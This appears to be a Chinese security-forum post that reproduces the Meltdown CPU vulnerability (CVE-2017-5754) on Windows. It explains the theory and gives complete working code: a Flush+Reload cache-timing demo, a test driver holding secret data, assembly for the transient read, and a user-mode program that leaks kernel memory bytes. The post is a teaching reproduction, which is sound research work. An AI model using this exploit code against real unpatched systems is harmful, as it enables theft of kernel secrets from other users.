
# [原创]CVE-2017-5754 Meltdown 复现

<a href="elink@887K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2T1K9h3I4A6j5X3W2D9K9g2)9J5k6h3y4G2L8g2)9J5c8Y4k6A6k6r3g2G2i4K6u0r3b7W2j5I4M7g2j5@1P5e0q4f1y4@1N6\*7i4K6u0r3">视频讲解</a>

<a href="elink@422K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1N6h3I4G2L8X3N6Q4x3X3c8D9j5h3u0Q4x3V1k6$3K9h3c8W2L8#2)9J5k6s2k6A6M7Y4c8#2j5h3I4Q4x3X3c8E0k6h3#2G2M7Y4W2Q4x3X3c8E0j5i4c8W2M7X3W2S2L8s2x3`.">GitHub代码</a>

页表条目中有一个 U/S 位，内核空间的地址会将这个位设置为 0，所以只有当 CPU 切换到内核模式时，这些内存才能被访问，应用程序访问这些地址会产生异常。

这个机制让操作系统将内核和应用程序隔离开来，因而系统能将内核映射到进程的虚拟地址空间，在保证数据安全的情况下，提高系统调用的效率。

但是 Meltdown 漏洞熔化了硬件机制所规定的安全边界，让用户程序得以访问到映射到内核空间的数据，U/S 位没有起作用。这破坏了我们之前对于 CPU 的基本假设，本来安全的操作系统变得不再安全。

![图片描述](upload/attach/202301/971628_4TF6XYCMGQAP5FS.png)

## Flush+Reload

Flush+Reload 不是 Meltdown，也不是 Meltdown 的成果，是一种比较好实现的利用 Meltdown 的方法。

```
#include <stdio.h>
#include <excpt.h>
#include <intrin.h>
#include <stdint.h>
uint8\_t probe\_array[256][4096]; // 探针数组
uint64\_t access\_time[256]; // 记录访问时间
int
main()
{
uint8\_t secret = 42;
uint8\_t\* p = &secret;
for (size\_t i = 0; i < 256; i++)
\_mm\_clflush(&probe\_array[i]);
\_\_try
{
\*(uint32\_t\*)NULL = 0;
probe\_array[\*p][0]++;
}
\_\_except (EXCEPTION\_EXECUTE\_HANDLER) {}
for (size\_t i = 0; i < 256; i++)
{
uint32\_t aux;
uint64\_t a = \_\_rdtscp(&aux);
probe\_array[i][0]++;
uint64\_t b = \_\_rdtscp(&aux);
access\_time[i] = b - a;
}
for (size\_t i = 0; i < 256; i++)
printf("%llu,", access\_time[i]);
}
```

当程序来到第 20 行，读取了非法内存地址，在触发异常之前的这一小段时间，后续的指令可能会被乱序执行。
- 如果 Windows 解决了异常，重新回到这个地方，继续执行第 21 行，那么 CPU 就可以直接利用乱序执行的结果，节省一些时间。
- 如果 Windows 没有解决，而是将执行权交还给程序，让程序执行异常处理块，也就是第 23 行，那么 CPU 就必须丢弃乱序执行的结果，让异常之后的代码看起来没有被执行过。

乱序执行的时候 `probe_array` 的数据可能已经从内存取出，更新到缓存中了。访问已经缓存的数据要比直接访问内存快得多，所以我们可以通过判断访问数据的时间，探测指定地址的内存是否已经被缓存了。

![图片描述](upload/attach/202301/971628_CFRKB44JGG5QU5D.png)

## Meltdown

用一句话概括 Meltdown：在乱序执行时，有些 CPU 忘记检查 U/S 位了，导致数据被读取了，虽然操作会被撤销，但数据会被缓存，产生了副作用，可利用 Flush+Reload 等方法利用这个副作用探测到内核的数据。

## 复现

### 准备秘密数据

编写一个驱动，在内核中申请一片内存，存放秘密数据，用来给 ring3 用 Meltdown 盗取。驱动还启动了一个线程，不断读写这片内存，迫使 CPU 缓存这些数据，提高盗取的成功率。

```
#include "win10.h"
#include "x64.h"
#include "secret.h"
PWSTR Secret;
HANDLE ThreadHandle;
BOOLEAN ThreadStopFlag = FALSE;
VOID
DriverUnload(PDRIVER\_OBJECT DriverObject)
{
DbgPrint("再见! %wZ\n", &DriverObject->DriverName);
ThreadStopFlag = TRUE;
ZwWaitForSingleObject(ThreadHandle, FALSE, NULL);
ZwClose(ThreadHandle);
ExFreePool(Secret);
}
VOID
StartRoutine(PVOID StartContext)
{
UNREFERENCED\_PARAMETER(StartContext);
KeSetSystemAffinityThread(1);
UINT32 Junk = 0;
size\_t SecretLength = wcslen(Secret);
LARGE\_INTEGER Inteval = { .QuadPart = -10000 };
while (!ThreadStopFlag)
{
for (size\_t i = 0; i < SecretLength; i++)
{
Junk ^= Secret[i];
Junk++;
KeDelayExecutionThread(KernelMode, FALSE, &Inteval);
}
}
PsTerminateSystemThread(STATUS\_SUCCESS);
}
NTSTATUS
DriverEntry(PDRIVER\_OBJECT DriverObject, PUNICODE\_STRING RegistryPath)
{
UNREFERENCED\_PARAMETER(RegistryPath);
DbgPrint("你好! %wZ\n", &DriverObject->DriverName);
DriverObject->DriverUnload = DriverUnload;
Secret = ExAllocatePool2(POOL\_FLAG\_NON\_PAGED, 4096, 'xxxx');
if (!Secret) return STATUS\_MEMORY\_NOT\_ALLOCATED;
wcscpy(Secret, SecretData);
NTSTATUS Status = PsCreateSystemThread(&ThreadHandle,
0, NULL, NULL, NULL,
StartRoutine, NULL
);
if (!NT\_SUCCESS(Status))
{
ExFreePool(Secret);
return Status;
}
DbgPrint("Secret @ %p\n", Secret);
return STATUS\_SUCCESS;
}
```

### Meltdown

ring3 利用 Meltdown 的核心函数是 `void OutOfOrderExecution(void* target, void* probe_array, void* null);`

```
.CODE
OutOfOrderExecution PROC
mov r8, qword ptr [r8]
movzx rax, byte ptr [rcx]
shl rax, 12
mov al, byte ptr [rdx + rax]
ret
OutOfOrderExecution ENDP
END
```

使用方法是

```
__try
{
OutOfOrderExecution(target, probe_array, NULL);
}
__except (EXCEPTION_EXECUTE_HANDLER) {}
```

调用后 `probe_array` 中的一些行会被缓存，统计每一行的访问时间，即可探测出一个位的数据。完整代码如下：

```
#include <stdio.h>
#include <intrin.h>
#include <excpt.h>
#include <stdint.h>
#include <locale.h>
#include <Windows.h>
uint8\_t probe\_array[256][4096];
uint64\_t access\_time[256];
void OutOfOrderExecution(void\* target, void\* probe\_array, void\* null);
uint8\_t
Steal(uint8\_t\* target)
{
for (size\_t retries = 0; retries < 30000; retries++)
{
for (size\_t i = 0; i < 256; i++)
{
\_mm\_clflush(&probe\_array[i]);
\_mm\_pause();
}
\_\_try
{
OutOfOrderExecution(target, probe\_array, NULL);
}
\_\_except (EXCEPTION\_EXECUTE\_HANDLER) {}
for (size\_t i = 0; i < 256; i++)
{
uint32\_t aux = 0;
uint64\_t a = \_\_rdtscp(&aux);
probe\_array[i][0]++;
uint64\_t b = \_\_rdtscp(&aux);
access\_time[i] = b - a;
}
size\_t idx\_min = 0;
for (size\_t i = 0; i < 256; i++)
{
if (access\_time[i] < access\_time[idx\_min]) idx\_min = i;
\_mm\_pause();
}
if (access\_time[idx\_min] < 100 && idx\_min != 0)
{
printf(" => %02X retries=%-5zd access\_time=%llu\n"
, (uint32\_t)idx\_min
, retries
, access\_time[idx\_min]
);
return (uint8\_t)idx\_min;
}
\_mm\_pause();
}
printf(" => 00\n");
return 0;
}
int
main(int argc, char\* argv[])
{
if (argc < 2)
{
printf("USAGE: meltdown target\n");
return 1;
}
uint8\_t\* target = NULL;
if (sscanf\_s(argv[1], "%p", &target) != 1)
{
printf("USAGE: meltdown target\n");
return 1;
}
SetProcessAffinityMask(GetCurrentProcess(), 1);
uint8\_t buffer[32] = { 0 };
for (size\_t i = 0; i < sizeof(buffer); i++)
{
printf("Steal#%-2zd", i);
buffer[i] = Steal(target + i);
}
for (size\_t i = 0; i < sizeof(buffer); i++)
{
printf("%02X", (uint32\_t)buffer[i]);
printf((i + 1) % 16 == 0 || i + 1 == sizeof(buffer) ? "\n" : " ");
}
setlocale(LC\_CTYPE, "");
wchar\_t\* secret = (wchar\_t\*)buffer;
for (size\_t i = 0; i < sizeof(buffer) / sizeof(wchar\_t); i++)
putwchar(secret[i]);
putchar('\n');
}
```

[视频讲解](https://bbs.kanxue.com/elink@9d5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2T1K9h3I4A6j5X3W2D9K9g2)9J5k6h3y4G2L8g2)9J5c8Y4k6A6k6r3g2G2i4K6u0r3b7W2j5I4M7g2j5@1P5e0q4f1y4@1N6*7i4K6u0r3)

[GitHub代码](https://bbs.kanxue.com/elink@f01K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1N6h3I4G2L8X3N6Q4x3X3c8D9j5h3u0Q4x3V1k6$3K9h3c8W2L8#2)9J5k6s2k6A6M7Y4c8#2j5h3I4Q4x3X3c8E0k6h3#2G2M7Y4W2Q4x3X3c8E0j5i4c8W2M7X3W2S2L8s2x3`.)
